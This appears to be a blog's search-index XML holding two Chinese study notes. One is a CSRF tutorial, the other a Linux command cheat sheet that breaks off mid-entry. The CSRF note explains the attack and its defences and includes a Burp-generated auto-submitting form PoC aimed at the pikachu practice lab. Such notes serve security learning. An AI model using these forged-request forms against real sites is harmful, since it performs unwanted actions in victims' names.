<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CSRF跨站请求伪造</title>
    <url>/2023/05/03/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
    <content><![CDATA[<h2 id="SRF跨站请求伪造"><a href="#SRF跨站请求伪造" class="headerlink" title="SRF跨站请求伪造"></a>SRF跨站请求伪造</h2><h4 id="CSRF漏洞概述"><a href="#CSRF漏洞概述" class="headerlink" title="CSRF漏洞概述"></a>CSRF漏洞概述</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	CSRF(Cross-Site Request Forgery,跨站请求伪造)，它是一种常见的Web攻击方式，很多开发者对它很陌生。它在2007年曾被列为互联网20大安全隐患之一。即使是大名鼎鼎的Gmail，在2007年底也存在CSRF漏洞，从而被黑客造成巨大的损失。CSRF也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。</span><br><span class="line">攻击者盗用了你在某个网站的身份，以你的名义发送恶意请求。</span><br></pre></td></tr></table></figure>

<h4 id="CSRF能做的事"><a href="#CSRF能做的事" class="headerlink" title="CSRF能做的事"></a>CSRF能做的事</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">以你的名义: </span><br><span class="line">发邮件</span><br><span class="line">发消息</span><br><span class="line">财产操作比如转账，或者购买商品</span><br><span class="line">新建文件...</span><br><span class="line">增删改查的操作他都可以做</span><br><span class="line">等等.....</span><br></pre></td></tr></table></figure>

<h4 id="CSRF攻击流程"><a href="#CSRF攻击流程" class="headerlink" title="CSRF攻击流程"></a>CSRF攻击流程</h4><p><img src="/../images/image-20230503130950272.png" alt="image-20230503130950272"></p>
<h4 id="CSRF利用前提条件"><a href="#CSRF利用前提条件" class="headerlink" title="CSRF利用前提条件"></a>CSRF利用前提条件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">从图中可以看到，要完成一次CSRF攻击，受害者必须一次完成两个步骤：</span><br><span class="line">	1.登录信任网站A,并在浏览器中保存相应的Cookie。</span><br><span class="line">	2.在不退出网站A的情况下，访问危险网站B。</span><br><span class="line"></span><br><span class="line">如果不满足以上两个条件中的一个，就不会受到CSRF的攻击。</span><br></pre></td></tr></table></figure>

<h4 id="CSRF利用过程"><a href="#CSRF利用过程" class="headerlink" title="CSRF利用过程"></a>CSRF利用过程</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">挟持用户:</span><br><span class="line">	其实我们不能挟持用户，但是我们可以挟持用户的浏览器发送任意的请求。</span><br><span class="line">某些html标签是可以发送HTTP GET类型的请求的。例如&lt;img&gt;</span><br><span class="line">&lt;img src=&quot;http://www.baidu.com&quot; /&gt;</span><br><span class="line"></span><br><span class="line">浏览器渲染img标签的时候，并不知道img标签中src属性的值，到底是不是一个图片，浏览器做的就是根据src中的链接，发起一个HTTP GET请求，并且携带上当前浏览器在目标网站上的凭证，也就是cookies，获取返回结果以图片的形式渲染</span><br><span class="line"></span><br><span class="line">根据这个特性，可以挟持用户的浏览器携带用户凭证(cookie)发送任意的请求</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">让用户执行非本意操作:</span><br><span class="line">	其实用户所有进行的操作，比如发送短消息，转账操作，用户只是操作的浏览器，而浏览器通过发送HTTP请求，才是真正的跟Web应用程序交互的操作。</span><br><span class="line"></span><br><span class="line">用户浏览器发送出去的HTTP请求代表了，用户的操作</span><br><span class="line"></span><br><span class="line">可以通过抓包获取用户操作背后的HTTP请求</span><br><span class="line"></span><br><span class="line">修改HTTP请求的相关参数后，挟持受害者发送修改后的HTTP请求</span><br><span class="line"></span><br><span class="line">受害者在不知情的情况下完成了发送短消息或者转账等操作</span><br></pre></td></tr></table></figure>

<h4 id="关于自动提交表单"><a href="#关于自动提交表单" class="headerlink" title="关于自动提交表单"></a>关于自动提交表单</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">&lt;meta charset=&quot;utf8&quot;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://www.pikachu.com/vul/csrf/csrfget/csrf_get_edit.php&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;gay&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;444dfgsdgdgd&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;nba&amp;#32;lakes&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;kobe&amp;#64;pikachu&amp;#46;com&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot; submit&quot; value=&quot;submit&quot; /&gt;                   &lt;!-- 一定要加空格在submit之前 --&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;跳转中,请稍候...&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.forms[0].submit();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="CSRF漏洞的分类与利用"><a href="#CSRF漏洞的分类与利用" class="headerlink" title="CSRF漏洞的分类与利用"></a>CSRF漏洞的分类与利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET CSRF:	</span><br><span class="line">	CSRF最初的一个错误观点，认为CSRF只能有GET请求发起，因此一些开发者认为只要把重要的操作改为只允许POST请求就能防CSRF</span><br><span class="line">	对于很多网站来说，即使是一些重要的操作使用POST来提交请求，但是服务端在接受请求的时候未严格的区分GET和POST。攻击者依然可以用GET来请求表单的提交地址。</span><br><span class="line">	比如在PHP中，如果使用的是$_REQUEST,而$_REQUEST既可以接受GET请求也可以接受POST请求。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST CSRF:</span><br><span class="line">	如果服务端已经区分了GET和POST,只用$_POST来接收请求数据。最简单的方法就是在攻击页面构造好一个form表单，然后用javascript自动提交这个表单。![image-20230503132342126](image/image-20230503132342126.png)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20230503132342126.png" alt="image-20230503132342126"></p>
<h4 id="CSRF漏洞的挖掘"><a href="#CSRF漏洞的挖掘" class="headerlink" title="CSRF漏洞的挖掘"></a>CSRF漏洞的挖掘</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.冒充身份：订阅/关注/转发/投票操作，删除文件，更改配置等</span><br><span class="line">2.帐户接管：密码修改，邮箱绑定，第三方帐户关联</span><br><span class="line">3.其他：登录/注册/注销/注册</span><br><span class="line">4.安全设计原则：CSRF登录后令牌未更新、登出后未注销等</span><br></pre></td></tr></table></figure>

<h4 id="CSRF漏洞的防御"><a href="#CSRF漏洞的防御" class="headerlink" title="CSRF漏洞的防御"></a>CSRF漏洞的防御</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">从漏洞原理来看</span><br><span class="line">关键操作增加验证码（比如说支付密码）</span><br><span class="line">验证referer </span><br><span class="line">使用Token</span><br><span class="line"></span><br><span class="line">从漏洞利用前提条件来看</span><br><span class="line">用户需要养成访问完一个网站之后，点击退出帐户的好习惯</span><br></pre></td></tr></table></figure>





]]></content>
  </entry>
  <entry>
    <title>Linux基础命令</title>
    <url>/2023/05/03/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="Linux基础命令"><a href="#Linux基础命令" class="headerlink" title="Linux基础命令"></a>Linux基础命令</h2><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">===================目录操作========================</span><br><span class="line">mkdir: 创建目录</span><br><span class="line">　　-p : 递归的创建目录 也就是可以创建多层目录</span><br><span class="line">　　一次创建多个目录： mkdir &#123;a,b,c,d,e,f&#125;</span><br><span class="line">　　一次创建 a b c d e f多个目录。</span><br><span class="line">rmdir：删除一个空文件夹</span><br><span class="line">cp：复制文件或者文件夹</span><br><span class="line"></span><br><span class="line">　　-a =-pdr</span><br><span class="line">　　-p 同时复制文件属性，比如修改日期</span><br><span class="line">　　-d 复制时保留文件链接</span><br><span class="line">　　-r: 复制文件夹时,递归复制子文件夹</span><br><span class="line">　　-l 不复制，而是创建指向源文件的链接文件，链接文件名由目标文件给出。   </span><br><span class="line">　　note:可以在拷贝的同时重命名</span><br><span class="line">mv：移动文件或者文件夹，可以在移动的时候重命名</span><br><span class="line"></span><br><span class="line">rm ：删除文件或者文件夹</span><br><span class="line">　　-r：递归删除</span><br><span class="line">　　-f：强制删除 即没有提醒</span><br><span class="line"></span><br><span class="line">======================文件处理命令==============================</span><br><span class="line">ls :查看文件</span><br><span class="line">　　-l 以列表形式查看</span><br><span class="line">　　-h 以一种人性化的方式查看，也是文件的大小以合适的单位显示</span><br><span class="line">　　-a 查看所有文件，包括隐藏文件</span><br><span class="line">　　-i 显示出文件的i节点号</span><br><span class="line">touch 文件名：创建文件 可以一次创建多个文件，以空格隔开</span><br><span class="line"></span><br><span class="line">cat :查看文件内容 </span><br><span class="line">　　-n:带行号</span><br><span class="line">tac:反向显示文件内容</span><br><span class="line"></span><br><span class="line">more：分页查看文件内容</span><br><span class="line">　　进入浏览模式后：</span><br><span class="line">　　f或者空格：下一页</span><br><span class="line">　　enter：一行一行往下翻</span><br><span class="line">　　q:退出</span><br><span class="line"></span><br><span class="line">less:查看文件内容 </span><br><span class="line">　　空格翻页</span><br><span class="line">　　回车换行</span><br><span class="line">　　pageup：上一页</span><br><span class="line">　　pagedown：下一页</span><br><span class="line">　　上箭头：向上翻</span><br><span class="line">　　下箭头：向下翻</span><br><span class="line">　　/搜索词 n向下找</span><br><span class="line"></span><br><span class="line">head -n 文件名 :查看文件前n行。缺省-n显示前<span class="number">10</span>行</span><br><span class="line">tail -n 文件名 ：查看文件的末尾几行</span><br><span class="line">　　-f :动态显示文件末尾内容</span><br><span class="line"></span><br><span class="line">ln:链接命令</span><br><span class="line">　　-s创建软连接</span><br><span class="line">　　硬链接和cp -p的区别是硬链接会同步更新</span><br><span class="line">　　源文件如果丢失，硬链接依然存在。</span><br><span class="line">　　硬链接和源文件的i节点相同。</span><br><span class="line">　　硬链接不能夸分区，软连接可以跨分区。</span><br><span class="line">　　硬链接不可以链接目录，链接可以</span><br><span class="line">　　软连接文件具有的权限是ugo都是rwx</span><br><span class="line"></span><br><span class="line">====================权限管理命令==============</span><br><span class="line">chmod:修改文件或目录的权限，只有root和所有者可以更改</span><br><span class="line">　　[&#123;ugoa&#125;&#123;+-=&#125;&#123;rwx&#125;] [文件或目录] </span><br><span class="line">　　[<span class="meta">mode=421</span>] [文件或目录]</span><br><span class="line">　　-R 递归修改</span><br><span class="line">　　权限的数字表示：</span><br><span class="line">　　r-&gt;<span class="number">4</span></span><br><span class="line">　　w-&gt;<span class="number">2</span></span><br><span class="line">　　x-&gt;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">　　例：chmod u+x a.txt</span><br><span class="line">　　　　chmod g+w,o-r a.txt <span class="comment">//同时做多个权限的修改</span></span><br><span class="line">　　　　chmod g=rwx a.txt</span><br><span class="line">　　　　chmod <span class="number">640</span> a.txt</span><br><span class="line">　　　　chmod -R <span class="number">777</span> testdir <span class="comment">//把目录和下面所有文件的权限</span></span><br><span class="line"></span><br><span class="line">　　　　　　　　　　　　针对文件　　 　　　　 针对目录</span><br><span class="line">　　　　r　　 读权限 　　 可以查看文件内容　　  可以列出目录中的内容</span><br><span class="line">　　　　w 　  写权限 　　 可以修改文件内容 　　 可以在目录中创建、删除文件</span><br><span class="line">　　　　x 　   执行权限      可以执行文件 　　　　 可以进入目录</span><br><span class="line"></span><br><span class="line">chown:更改文件所有者，只有root可以更改</span><br><span class="line">　　chown root a.txt<span class="comment">//把a.txt更改为root所有</span></span><br><span class="line"></span><br><span class="line">chgrp:更改所属组</span><br><span class="line">　　chgrp lambrother fengjie <span class="comment">//把fengjie的所属组更改为lambrother</span></span><br><span class="line"></span><br><span class="line">umask -S:查看创建文件的缺省权限，即默认权限</span><br><span class="line">umask <span class="number">023</span>:修改文件的缺省权限为<span class="number">777</span><span class="number">-023</span>=<span class="number">754</span>。即rwxr-xr--</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">=====================文件搜索命令========================================</span><br><span class="line">find:搜索制定范围内的文件</span><br><span class="line">　　find [搜索范围] [匹配条件]</span><br><span class="line">　　-name 按文件名搜索</span><br><span class="line">　　-iname 根据文件名查找，不区分大小写</span><br><span class="line">　　-size +n大于 -n小于 n等于 这个n是数据块，在Linux中一个数据块是<span class="number">512</span>字节大小</span><br><span class="line">　　-user 根据所有者查找</span><br><span class="line">　　-<span class="keyword">group</span> 根据所属组查找</span><br><span class="line">　　根据文件属性查找：</span><br><span class="line">　　　　-amin 访问时间 access</span><br><span class="line">　　　　-cmin 根据文件属性被修改的时间 change</span><br><span class="line">　　　　-mmin 根据文件内容被修改的时间 modify</span><br><span class="line">　　例： find /etc -cmin <span class="number">-5</span> :查找/etc目录下五分钟内被修改过属性的文件和目录</span><br><span class="line"></span><br><span class="line">　　-a 两个条件同时满足</span><br><span class="line">　　　　find /etc -size +<span class="number">10</span> -a -size <span class="number">-50</span></span><br><span class="line">　　-o 两个条件满足一个即可</span><br><span class="line"></span><br><span class="line">　　-type </span><br><span class="line">　　　　f 文件 d 目录 l软连接文件</span><br><span class="line">　　-inum 根据i节点查找</span><br><span class="line"></span><br><span class="line">　　对找到的结果进行操作</span><br><span class="line">　　　　-exec或者-ok 命令 &#123;&#125; \;</span><br><span class="line">　　　　例如：</span><br><span class="line">　　　　　　find /etc -name <span class="keyword">init</span>* -exec ls -l &#123;&#125; \; 对找到的文件名按列表查看</span><br><span class="line"></span><br><span class="line">　　find /etc -name <span class="keyword">init</span> :搜索目录/etc下面所有的<span class="keyword">init</span>文件，精确匹配，包括子目录中的<span class="keyword">init</span>文件</span><br><span class="line">　　find / -size +<span class="number">204800</span> 搜索大于<span class="number">100</span>M的文件</span><br><span class="line"></span><br><span class="line">locate:(查找速度非常快，因为它维护了一个文件库。缺点就是新建立的文件没有很快收录到文件库)</span><br><span class="line">　　locate 文件名</span><br><span class="line">　　updatedb 更新locate的文件资料库 文件资料库不收录/tmp下的文件</span><br><span class="line">　　-i 不区分大小写</span><br><span class="line"></span><br><span class="line">which :查找命令的目录以及别名</span><br><span class="line">　　which 命令</span><br><span class="line"></span><br><span class="line">whereis :搜索命令所在目录及帮助文档路径。</span><br><span class="line"></span><br><span class="line">grep:在文件中搜寻字符串匹配的行并输出，多个文件以空格隔开。</span><br><span class="line">　　-i不区分大小写</span><br><span class="line">　　-v排除指定字符串</span><br><span class="line">　　-E 以正则表达式的方式搜索</span><br><span class="line">　　-F 以普通文本的方式搜索</span><br><span class="line">　　-n 显示搜索到的内容在文件中的行号。</span><br><span class="line"></span><br><span class="line">==================帮助命令======================</span><br><span class="line">man：查看命令或者配置文件的帮助信息</span><br><span class="line">　　man 命令/配置文件</span><br><span class="line">　　在手册里面，可以输入/要查找的str</span><br><span class="line">　　man ls</span><br><span class="line">　　man services</span><br><span class="line">　　man fstab <span class="comment">//直接输入配置文件的名字，而不需要使用绝对路径 重点查看name选项和配置文件的格式。</span></span><br><span class="line">　　如果一个命令即使命令又是配置文件，那么可以使用一个序号进行区分，比如：</span><br><span class="line">　　man <span class="number">1</span> passwd 查看命令passwd的帮助</span><br><span class="line">　　man <span class="number">5</span> passwd 查看配置文件passwd的帮助</span><br><span class="line"></span><br><span class="line">whatis 命令：得到命令的简要信息</span><br><span class="line"></span><br><span class="line">apropos 配置文件名：查看配置文件的简短信息</span><br><span class="line"></span><br><span class="line">命令 --help：查看命令的选项。</span><br><span class="line"></span><br><span class="line">help 命令：查看shell内置命令的帮助信息。 shell内置命令是没有命令路径。不能使用man查看帮助。</span><br><span class="line"></span><br><span class="line">===================用户管理命令==========================================</span><br><span class="line">useradd: 添加用户</span><br><span class="line">　　useradd 用户名</span><br><span class="line"></span><br><span class="line">passwd: 修改用户密码</span><br><span class="line">　　passwd 用户名 不加用户名直接更改自己的密码</span><br><span class="line"></span><br><span class="line">who:查看当前的账户 显示的格式为： 登录用户名 登录终端（tty:本地登录 pts:远程终端） 登录时间 ip地址</span><br><span class="line"></span><br><span class="line">　　w:查看更详细的用户登录信息。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=====================================压缩解压缩命令============================</span><br><span class="line">.gz格式</span><br><span class="line">　　压缩：gzip 文件名 只能压缩文件不能压缩目录，压缩完源文件也不见了</span><br><span class="line">　　解压缩：gunzip/gzip -d 压缩包名称</span><br><span class="line"></span><br><span class="line">tar:</span><br><span class="line">　　-zcvf 压缩后文件名 打包的目录 :生成.tar.gz文件 注：这个命令先用tar归档，然后把归档的包压缩成.gz</span><br><span class="line">　　-zxvf 要解压的文件名 ：解压缩.tar.bz2的文件</span><br><span class="line"></span><br><span class="line">　　-jcvf 压缩后的文件名 打包的目录：生成.tar.bz2 注：这个命令先用tar归档，然后把归档的包压缩成.bz2</span><br><span class="line">　　-jxvf 要解压的文件名 :解压.tar.bz2的文件</span><br><span class="line"></span><br><span class="line">zip:</span><br><span class="line">　　zip -r 压缩生成的文件名 要压缩的目录</span><br><span class="line">　　zip 压缩生成的文件名 要压缩的文件。</span><br><span class="line"></span><br><span class="line">unzip:</span><br><span class="line">　　unzip 要解压缩的文件</span><br><span class="line"></span><br><span class="line">bzip2:</span><br><span class="line">　　bzip2 -k 要压缩的文件名 -k选项：保留源文件</span><br><span class="line">　　bunzip2 -k 要解压的文件名 -k选项：保留压缩包</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">===============网络命令==========================</span><br><span class="line">write:给在线用户发送信息，用户不在线不行。以Ctrl+D保存</span><br><span class="line">　　write 用户名</span><br><span class="line"></span><br><span class="line">wall:给所有用户名发送信息</span><br><span class="line">　　wall 要发送的信息</span><br><span class="line"></span><br><span class="line">ping:测试网络连通性</span><br><span class="line"></span><br><span class="line">　　ping ip地址 </span><br><span class="line">　　-c 要ping的次数</span><br><span class="line"></span><br><span class="line">ifconfig:</span><br><span class="line">　　直接回车查看当前网卡信息</span><br><span class="line">　　ifconfig 网卡名 ip地址 临时修改网络ip</span><br><span class="line">　　　　ifconfig th0:<span class="number">0</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span> netmask <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">　　　　　　给th0这个网卡新添加一个ip</span><br><span class="line">　　　　ifconfig eth0:<span class="number">0</span> down</span><br><span class="line">　　　　ifconfig eth0:<span class="number">0</span> up</span><br><span class="line">ifdown th0</span><br><span class="line">　　禁用th0这块网卡</span><br><span class="line"></span><br><span class="line">ifup th0</span><br><span class="line">　　开启th0这块网卡</span><br><span class="line"></span><br><span class="line">mail:邮件命令</span><br><span class="line">　　mail 要发送的用户名</span><br><span class="line">　　mail 直接回车：查看命令</span><br><span class="line">　　　　help :查看支持的命令格式</span><br><span class="line">　　　　输入序列号：查看邮件详细内容</span><br><span class="line">　　　　h: 回到邮件列表</span><br><span class="line">　　　　d 序列号：删除序列号对应的邮件</span><br><span class="line"></span><br><span class="line">last:统计计算机所有用户登录的时间信息，以及重启信息</span><br><span class="line">lastlog:所有用户最后一次登录的时间</span><br><span class="line">　　-u 用户的uid 查看指定用户的登录信息。</span><br><span class="line"></span><br><span class="line">traceroute:显示数据包到主机间的路径</span><br><span class="line">　　traceroute 要探测的地址.</span><br><span class="line">　　-n 使用ip而不使用域名</span><br><span class="line"></span><br><span class="line">nslookup www.baidu.com</span><br><span class="line">　　查看百度的ip地址</span><br><span class="line"></span><br><span class="line">netstat:显示网络相关信息</span><br><span class="line">　　-t :tcp协议</span><br><span class="line">　　-u :udp协议</span><br><span class="line">　　-l:监听</span><br><span class="line">　　-r:路由</span><br><span class="line">　　-n:显示ip地址和端口号</span><br><span class="line"></span><br><span class="line">　　netstat -tlun:查看本机监听的端口</span><br><span class="line">　　netstat -an:查看所有的监听信息</span><br><span class="line">　　netstat -rn ：查看路由表，即网管</span><br><span class="line"></span><br><span class="line">wget 文件地址</span><br><span class="line">　　下载文件</span><br><span class="line"></span><br><span class="line">service network restart:重启网络服务。</span><br><span class="line"></span><br><span class="line">telnet 域名或ip</span><br><span class="line">　　远程管理与端口探测</span><br><span class="line">　　如： telnet <span class="number">192.168</span><span class="number">.2</span><span class="number">.3</span>:<span class="number">80</span></span><br><span class="line">　　　　探测<span class="number">192.168</span><span class="number">.2</span><span class="number">.3</span>是否开启了<span class="number">80</span>端口</span><br><span class="line"></span><br><span class="line">mount:挂在命令</span><br><span class="line">　　mount -t iso9660 /dev/sr0 /mnt/cdrom :把sr0挂在到cdrom</span><br><span class="line"></span><br><span class="line">==============关机重启命令====================</span><br><span class="line"></span><br><span class="line">shutdown:这个关机命令更安全一些，不推荐使用其他关机命令。</span><br><span class="line">　　-h：关机</span><br><span class="line">shutdown -h now shutdown -h <span class="number">20</span>:<span class="number">30</span></span><br><span class="line">　　-r:重启 </span><br><span class="line">shutdown -r now </span><br><span class="line">　　-c:取消上次的关机命令</span><br><span class="line"></span><br><span class="line">重启：</span><br><span class="line">　　<span class="keyword">init</span> <span class="number">6</span></span><br><span class="line">　　reboot</span><br><span class="line"></span><br><span class="line">关机：</span><br><span class="line">　　<span class="keyword">init</span> <span class="number">0</span></span><br><span class="line">　　poweroff</span><br><span class="line"></span><br><span class="line">　　系统运行级别：</span><br><span class="line">　　　　<span class="number">0</span> 关机</span><br><span class="line">　　　　<span class="number">1</span> 单用户 类似windows安全模式</span><br><span class="line">　　　　<span class="number">2</span> 不完全多用户，不含nfs服务</span><br><span class="line">　　　　<span class="number">3</span> 完全多用户</span><br><span class="line">　　　　<span class="number">4</span> 未分配</span><br><span class="line">　　　　<span class="number">5</span> 图形界面</span><br><span class="line">　　　　<span class="number">6</span> 重启</span><br><span class="line">　　可以通过查看/etc/inittab来查看系统启动的运行级别</span><br><span class="line">　　runlevel:查看当前的运行级别</span><br><span class="line">　　<span class="keyword">init</span> n:设置系统运行级别</span><br><span class="line"></span><br><span class="line">logout:退出当前用户，返回到登录界面</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">==============其他小技巧==========</span><br><span class="line">\命令名字 :使用原始的命令</span><br><span class="line">　　比如：</span><br><span class="line">　　　　ls 实际上是ls --color auto</span><br><span class="line">　　　　\ls 就是原始的ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=============================================</span><br><span class="line">一、软件包分类</span><br><span class="line">　　源码包</span><br><span class="line">　　　　脚本安装包</span><br><span class="line">　　特点：</span><br><span class="line">　　　　<span class="number">1.</span> 开源</span><br><span class="line">　　　　<span class="number">2.</span> 可以自由选择所需的功能</span><br><span class="line">　　　　<span class="number">3.</span> 软件是编译安装，所以更加适合自己的系统，更加稳定也效率更高</span><br><span class="line">　　　　<span class="number">4.</span> 卸载方便，即可以直接删除文件夹。</span><br><span class="line">　　缺点：</span><br><span class="line">　　　　<span class="number">1.</span> 安装过程步骤较多，尤其安装较大的软件集合时，容易出现错误</span><br><span class="line">　　　　<span class="number">2.</span> 编译时间较长，安装毕二进制安装时间长</span><br><span class="line">　　　　<span class="number">3.</span> 因为是编译安装，安装过程中一旦报错新手很难解决</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">　　二进制包(RPM包、系统默认包)</span><br><span class="line">　　　　优点：</span><br><span class="line">　　　　　　<span class="number">1.</span> 包管理系统简单，只通过几个命令就可以实现包的安装、升级、查询和卸载</span><br><span class="line">　　　　　　<span class="number">2.</span> 安装速度比源码包安装快的多</span><br><span class="line">　　　　缺点：</span><br><span class="line">　　　　　　<span class="number">1.</span> 经过编译，不再可以看到源代码</span><br><span class="line">　　　　　　<span class="number">2.</span> 功能选择不如源码包灵活</span><br><span class="line">　　　　　　<span class="number">3.</span> 依赖性</span><br><span class="line"></span><br><span class="line">=============rpm命令管理-包命名与依赖性=======================================</span><br><span class="line"><span class="number">1.</span> RPM包命名原则</span><br><span class="line">　　httpd<span class="number">-2.2</span><span class="number">.15</span><span class="number">-15.</span>el6.centos.l.i686.rpm</span><br><span class="line">　　　　httpd 软件包名</span><br><span class="line">　　　　<span class="number">2.2</span><span class="number">.15</span> 软件版本</span><br><span class="line">　　　　<span class="number">15</span> 软件发布的次数</span><br><span class="line">　　　　el6.centos 适合的Linux平台</span><br><span class="line">　　　　i686 适合的硬件平台</span><br><span class="line">　　　　rpm rpm包扩展名</span><br><span class="line">　　　　如果名字里有noarch,则表示所有平台都可以。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、 rpm包依赖性</span><br><span class="line">　　　　树形依赖： a-&gt;b-&gt;c 从后往前安装所依赖的包。</span><br><span class="line">　　　　环形依赖： a-&gt;b-&gt;c-&gt;a 解决办法：一次性安装三个包</span><br><span class="line">　　　　模块依赖：模块依赖查询网站 ：www.rpmfind.net 一般以.so.数字结尾的依赖包，是库依赖包，只需要安装包括这个库的软件就可以自动安装好这个所需的库依赖包</span><br><span class="line"></span><br><span class="line">包全名：操作的包是没有安装的软件包时，使用包全名，而且要注意路径。安装、升级时用</span><br><span class="line">包名 ：操作已经安装的软件包时，使用包名。是搜索/<span class="keyword">var</span>/lib/rpm中的数据库。一般查询，卸载时用</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> rpm安装：</span><br><span class="line">　　rpm-ivh 包全名</span><br><span class="line">　　　　-i(install) 安装</span><br><span class="line">　　　　-v(verbose) 显示详细信息</span><br><span class="line">　　　　-h(hash) 显示进度</span><br><span class="line">　　　　--nodeps 不检测依赖性 一般都必须要检测</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> rpm包升级：</span><br><span class="line">　　rpm -Uvh 包全名</span><br><span class="line">　　　　-U(upgrade) 升级</span><br><span class="line">　　　　-h</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> rpm -e 包名</span><br><span class="line">　　-e(erase) 卸载</span><br><span class="line">　　--nodeps 不检查依赖性</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span> 查询是否安装</span><br><span class="line">　　rpm - q 包名 :查询包是否安装</span><br><span class="line">　　　　-q(query) 查询</span><br><span class="line">　　　　-a(all) 所有</span><br><span class="line">　　　　-i(information) 查询软件信息</span><br><span class="line">　　　　-p(package) 查询未安装包信息</span><br><span class="line">　　rpm -ql 包名：查询包中文件安装位置(list) 注：包的安装路径在包生成的时候就确定了</span><br><span class="line">　　rpm -qlp 包全名：查询未安装包安装时会安装在哪里。</span><br><span class="line">　　rpm -qf 系统文件名 ：查询系统文件属于哪个rpm包 注：系统文件名必须是通过安装哪个包生成的文件</span><br><span class="line">　　　　-f:查询系统文件属于哪个包</span><br><span class="line">　　rpm -qR 包名 查询已安装软件包的依赖性</span><br><span class="line">　　　　-r: 查询软件包的依赖性(requires)</span><br><span class="line">　　rpm -qRp:查询未安装包的依赖性</span><br><span class="line">　　　　-p: 查询未安装包的依赖性</span><br><span class="line"></span><br><span class="line">　　　　例如：</span><br><span class="line">　　　　　　rpm -qa | grep httpd 查询所有Apache的包</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span> rpm包校验</span><br><span class="line">　　rpm -V 已安装的包名 ：如果没有提示则表示没有被修改过</span><br><span class="line">　　　　-V 校验指定rpm包中的文件(verify)</span><br><span class="line">　　　　校验值的含义：</span><br><span class="line">　　　　　　S:文件大小是否改变</span><br><span class="line">　　　　　　M:文件的类型或文件的权限(rwx)是否被改变</span><br><span class="line">　　　　　　<span class="number">5</span>：文件MD5校验和是否改变(可以看成文件内容是否改变)</span><br><span class="line">　　　　　　D:设备的中，从代码是否改变</span><br><span class="line">　　　　　　L:文件路径是否改变</span><br><span class="line">　　　　　　U:文件的属主(所有者)是否改变</span><br><span class="line">　　　　　　G:文件的属组是否改变</span><br><span class="line">　　　　　　T:文件的修改时间是否改变</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span> rpm包中文件提取：</span><br><span class="line">　　rpm2cpio 包全名 | \</span><br><span class="line">　　cpio -div .文件绝对路径</span><br><span class="line"></span><br><span class="line">　　rpm2cpio:讲rpm包转换为cpio格式的命令 </span><br><span class="line">　　\表示命令没有输完,在下一行继续输入</span><br><span class="line">　　cpio:是一个标准工具，它用于创建软件档案文件和从档案文件中提取文件</span><br><span class="line">　　cpio 选项 &lt;[文件|设备]</span><br><span class="line">　　　　-i copy-<span class="keyword">in</span>模式，还原</span><br><span class="line">　　　　-d:还原时自动新建目录</span><br><span class="line">　　　　-v:显示还原过程</span><br><span class="line"></span><br><span class="line">　　例如：</span><br><span class="line">　　　　rpm -qf /bin/ls <span class="meta">#查看ls命令属于哪个包</span></span><br><span class="line">　　　　mv /bin/ls /tmp <span class="meta">#将ls命令移走</span></span><br><span class="line">　　　　rpm2cpio /mnt/cdrom/Packages/coreutils<span class="number">-8.4</span><span class="number">-19.</span>el6.i686.rpm | cpio -idv ./bin/ls <span class="meta">#提取rpm保重ls命令到当前目录的/bin/ls下</span></span><br><span class="line">　　　　cp /root/bin/ls /bin/ <span class="meta">#把ls命令复制到/bin/目录，修复文件丢失</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">yum在线管理：</span><br><span class="line">一、 ip地址配置</span><br><span class="line">第<span 